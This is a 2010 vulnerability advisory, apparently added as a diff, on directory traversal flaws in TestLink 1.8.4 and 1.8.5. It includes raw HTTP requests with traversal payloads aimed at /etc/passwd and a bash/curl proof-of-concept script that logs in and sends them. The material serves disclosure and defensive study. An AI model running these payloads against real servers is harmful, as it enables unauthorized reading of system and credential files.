@@ -1,0 +1,109 @@
+1.Title :Multiple directory Traversal Vulnerabilites in Testlink TestManagement and Execution System.
+  Discovered by: Prashant Khandelwal (clickprashant@gmail.com<mailto:clickprashant@gmail.com>)
+  Submitted :Jan-15-2010
+  Bugtraq id : http://www.securityfocus.com/bid/37824
+  Secunia : http://secunia.com/advisories/38201/
+
+2.Vulnerability Information
+
+  Class: Directory Traversal
+  Remotely Exploitable: Yes
+  Locally Exploitable: No
+
+
+3.Vulnerable packages.
+
+Versions affected :All versions <= Testlink 1.8.5
+Download : http://downloads.sourceforge.net/project/testlink/TestLink%201.8/TestLink%201.8.5/testlink_1.8.5.tgz?use_mirror=nchc
+
+
+4.Vulnerability Description
+
+Multiple directory traversal vulnerabilities has been found in Testlink(http://www.teamst.org/) a popular and acclaimed free, open source Test management tool written in PHP.
+The issue discovered can only be exploited with an authenticated session.This directory traversal vulnerability is present in the file /testlink/lib/usermanagement/
+userInfo.php  & In testlink 1.8.4 these issues can be exploited by setting the variable "editUser"& "locale" like below with a HTTP POST request
+
+Example HTTP header for 1.8.5
+
+-----------------------------------------------------------------------------------------------------------------------------------
+a)Directory Traversal :The POST variable editUser has been set to ../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd
+------------------------------------------------------------------------------------------------------------------------------------
+Request
+
+POST /testlink/lib/usermanagement/userInfo.php HTTP/1.0
+id=1&firstName=Testlink&lastName=Administrator&emailAddress=111-222-1933email%40address%2Etst&locale=cs_CZ&editUser=../..//../..//../..//../..//../..//../..//../..//../..//etc/passwdResponse
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+b)Directory Traversal :The POST variable locale has been set to ../../../../../../../../etc/passwd%00.html
+------------------------------------------------------------------------------------------------------------------------------------
+Request
+
+POST /testlink/lib/usermanagement/userInfo.php HTTP/1.0
+id=1&firstName=Testlink&lastName=Administrator&emailAddress=111-222-1933email%40address%2Etst&locale=../../../../../../../../etc/passwd%00.html&editUser=GuardarResponse
+
+
+In testlink 1.8.4 these issues can be exploited by setting the variable "genApiKey"& "locale" like below with a HTTP POST request.
+
+Exploit for 1.8.4
+
+-----------------------------------------------------------------------------------------------------------
+a)Directory traverasa : The POST variable locale has been set to ../../../../../../../../etc/passwd%00.html.
+-----------------------------------------------------------------------------------------------------------
+Request
+
+POST /testlink/lib/usermanagement/userInfo.php HTTP/1.0
+id=1&firstName=Testlink&lastName=Administrator&emailAddress=111-222-1933email@address.tst&locale=../../../../../../../../etc/passwd%00.html&editUser=SaveResponse
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+b)Directory Traversal : The POST variable genApiKey has been set to ../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd
+------------------------------------------------------------------------------------------------------------------------------------
+Request
+
+POST /testlink/lib/usermanagement/userInfo.php HTTP/1.0
+id=1&genApiKey=../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd
+
+
+One of the issues in Testlink 1.8.4 can be exploited by directory traversing with the HTTP User-Agent header like below.
+
+-----------------------------------------------------------------------------------------------------------------------------------
+c)Directory Traversal :The HTTP header user-agent has been set to ../../../../../../../../etc/passwd .htm.
+------------------------------------------------------------------------------------------------------------------------------------
+
+Request
+
+GET /testlink/lib/usermanagement/userInfo.php HTTP/1.0
+Accept: */*
+User-Agent: ../../../../../../../../etc/passwd .htm
+Host: 10.209.84.1
+Cookie: PHPSESSID=ad966ffbe53232c258f231404cef4552;TL_lastTestProjectForUserID_1=2381
+Connection: Close
+Pragma: no-cacheResponse
+
+
+5.Proof of Concept
+
+The below POC has been tested with testlink 1.8.5
+===============================================================================================================================================================
+#!/usr/bin/env bash
+# Prashant Khandelwal [clickprashant@gmail.com<mailto:clickprashant@gmail.com>]
+# Remote Directory Traversal in Testlink the Test Management Tool
+# Vendor : Testlink http://www.teamst.org<http://www.teamst.org/>
+# Affected Version : <=1.8.5  (http://downloads.sourceforge.net/project/testlink/TestLink%201.8/TestLink%201.8.5/testlink_1.8.5.tgz?use_mirror=nchc)
+# Vulnerability Discovered: 5-Jan-2010
+# This POC is for Educational purpose
+
+if [ $# -ne 4 ]
+then
+
+    echo "Usage   - ./$0  User password  Testlink_root_dir_URI  Directory_traversal_string"
+    echo "Example - ./$0  admin admin http://Testlink-Server/testlink<http://testlink-server/testlink> ../../../../../../../../etc/passwd%00.html"
+    exit 1
+fi
+rm -rf cookies output.txt
+curl -d "tl_login=$1&tl_password=$2" $3/login.php -c cookies
+curl -d "id=1&firstName=Directorytraversal&lastName=Exploit&emailAddress=111-222-1933email%40address%2Etst&locale=$4&editUser=admin" $3/lib/usermanagement/userInfo.php -b cookies -v | more >output.txt
+head -n 80  output.txt
+
+===============================================================================================================================================================
